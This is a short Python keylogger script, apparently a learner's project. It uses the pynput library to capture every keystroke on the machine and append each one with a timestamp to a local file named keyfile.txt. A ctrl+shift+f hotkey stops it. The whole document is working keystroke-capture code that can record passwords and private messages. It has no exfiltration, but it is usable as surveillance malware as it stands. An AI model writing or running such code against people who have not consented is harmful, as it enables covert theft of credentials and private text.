from pynput import keyboard
import datetime


# this variable used for the while True that stop the code from stop
program_running = True

def time_taker():


    date = datetime.date(2025, 1, 3)
    today = datetime.date.today()

    time = datetime.time(12, 30, 34)
    now = datetime.datetime.now()

    now = now.strftime("%H:%M:%S--%d/%m/%Y")

    return now





def keypressed(key):
    # writes the key to the file
    # parameter: key: the key to write
    # returns: None
    print(str(key))
    with (open("keyfile.txt", 'a')as logkey):
        try:
            char=key.char
            now=time_taker()
            #print(now)
            #logkey.write(char,now)
            #logkey.write(char+now)
            logkey.write(now+":"+char+"\n")
        except:
            print("error getting char")

def on_activate_h():
    """when <ctrl>+<shift>+f pressed the func change the global program_running to False and the script stopped"""
    global program_running
    program_running = False


def listiner():
    listener=keyboard.Listener(on_press=keypressed)
    listener.start()
    keyboard.GlobalHotKeys({'<ctrl>+<shift>+f': on_activate_h}).start()
    while program_running:
        pass

if __name__=="__main__":
   # print(keypressed)
   # print(time_taker)
   listiner()